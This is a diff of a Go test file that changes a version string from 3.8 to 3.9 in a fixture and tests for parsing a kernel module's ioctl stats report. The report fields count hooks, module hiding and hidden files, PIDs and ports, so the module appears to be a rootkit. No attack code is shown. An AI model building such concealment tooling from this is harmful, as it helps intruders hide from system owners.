@@ -9,7 +9,7 @@ import (
 // statsReportFixture is the EXACT text IOCTL_GET_STATS emits (the
 // snprintf block in src/ioctl.c) for a module with all 7 hooks, one
 // hidden file, one hidden PID and one hidden port.
-const statsReportFixture = "module=vault_kernel version=3.8\n" +
+const statsReportFixture = "module=vault_kernel version=3.9\n" +
 	"hooks_installed=7 hooks_planned=7\n" +
 	"module_hidden=0\n" +
 	"hidden_files=1 hidden_pids=1 hidden_ports=1\n" +
@@ -21,7 +21,7 @@ func TestParseStatsReportKernelFixture(t *testing.T) {
 
 	want := map[string]string{
 		"module":          "vault_kernel",
-		"version":         "3.8",
+		"version":         "3.9",
 		"hooks_installed": "7",
 		"hooks_planned":   "7",
 		"module_hidden":   "0",
@@ -39,12 +39,12 @@ func TestParseStatsReportKernelFixture(t *testing.T) {
 // Regression for the v3.4/v3.5 line-based parser: every pair after the
 // first on a line used to be swallowed into the previous value.
 func TestParseStatsReportKeepsAllPairsOfALine(t *testing.T) {
-	got := ParseStatsReport("module=vault_kernel version=3.8\n")
+	got := ParseStatsReport("module=vault_kernel version=3.9\n")
 	if got["module"] != "vault_kernel" {
 		t.Errorf("module = %q, want %q", got["module"], "vault_kernel")
 	}
-	if got["version"] != "3.8" {
-		t.Errorf("version = %q, want %q (line parser lost this key)", got["version"], "3.8")
+	if got["version"] != "3.9" {
+		t.Errorf("version = %q, want %q (line parser lost this key)", got["version"], "3.9")
 	}
 }
 
